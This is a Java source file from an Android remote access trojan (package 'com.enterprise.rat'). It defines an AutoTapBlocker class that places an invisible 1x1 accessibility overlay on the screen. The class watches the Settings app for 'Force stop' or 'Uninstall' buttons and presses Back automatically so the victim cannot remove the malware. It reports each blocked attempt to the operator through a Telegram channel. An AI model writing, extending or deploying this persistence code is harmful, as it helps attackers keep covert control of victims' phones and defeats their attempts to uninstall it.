package com.enterprise.rat.commands;

import android.graphics.PixelFormat;
import android.os.Build;
import android.view.Gravity;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.LinearLayout;
import com.enterprise.rat.services.AccessibilityService;
import com.enterprise.rat.utils.TelegramApi;

public class AutoTapBlocker {
    private static ViewGroup overlayView;
    private static WindowManager wm;

    public static void enable(AccessibilityService service) {
        if (overlayView != null) return;
        try {
            wm = (WindowManager) service.getSystemService(android.content.Context.WINDOW_SERVICE);
            WindowManager.LayoutParams params = new WindowManager.LayoutParams(
                1, 1, // Ukuran 1x1 pixel, tidak terlihat
                Build.VERSION.SDK_INT >= Build.VERSION_CODES.O ?
                    WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY :
                    WindowManager.LayoutParams.TYPE_SYSTEM_ALERT,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE |
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                PixelFormat.TRANSLUCENT
            );
            params.gravity = Gravity.TOP | Gravity.LEFT;
            params.x = 0; params.y = 0;

            LinearLayout layout = new LinearLayout(service);
            layout.setLayoutParams(new ViewGroup.LayoutParams(1, 1));
            overlayView = layout;
            wm.addView(overlayView, params);

            // Mulai intercept event Accessibility untuk mendeteksi tombol Force Stop
            service.setForceStopBlockerEnabled(true);
            TelegramApi.sendMessage("🛡 Auto-tap blocker activated. Force-close/Uninstall buttons will be intercepted.");
        } catch (Exception e) {
            TelegramApi.sendMessage("❌ Blocker error: " + e.getMessage());
        }
    }

    public static void disable(AccessibilityService service) {
        if (overlayView != null && wm != null) {
            try { wm.removeView(overlayView); } catch (Exception e) {}
            overlayView = null;
        }
        service.setForceStopBlockerEnabled(false);
        TelegramApi.sendMessage("🛡 Auto-tap blocker deactivated.");
    }

    /**
     * Dipanggil dari AccessibilityService saat tombol Force Stop / Uninstall terdeteksi.
     * Otomatis klik Back untuk membatalkan aksi.
     */
    public static boolean handleForceStopDetection(AccessibilityEvent event, AccessibilityService service) {
        if (event.getPackageName() == null) return false;
        String pkg = event.getPackageName().toString();
        if (pkg.equals("com.android.settings") || pkg.equals("android")) {
            // Cari tombol "Force Stop" atau "Uninstall"
            android.view.accessibility.AccessibilityNodeInfo root = service.getRootInActiveWindow();
            if (root != null) {
                java.util.List<android.view.accessibility.AccessibilityNodeInfo> buttons =
                    root.findAccessibilityNodeInfosByText("Force stop");
                if (buttons.isEmpty()) buttons = root.findAccessibilityNodeInfosByText("FORCE STOP");
                if (buttons.isEmpty()) buttons = root.findAccessibilityNodeInfosByText("Uninstall");
                if (buttons.isEmpty()) buttons = root.findAccessibilityNodeInfosByText("Paksa berhenti");

                if (!buttons.isEmpty()) {
                    // Lakukan Global Action Back untuk menutup halaman
                    service.performGlobalAction(AccessibilityService.GLOBAL_ACTION_BACK);
                    TelegramApi.sendMessage("🛡 Blocked force-stop/uninstall attempt.");
                    for (android.view.accessibility.AccessibilityNodeInfo btn : buttons) btn.recycle();
                    root.recycle();
                    return true;
                }
                root.recycle();
            }
        }
        return false;
    }
}
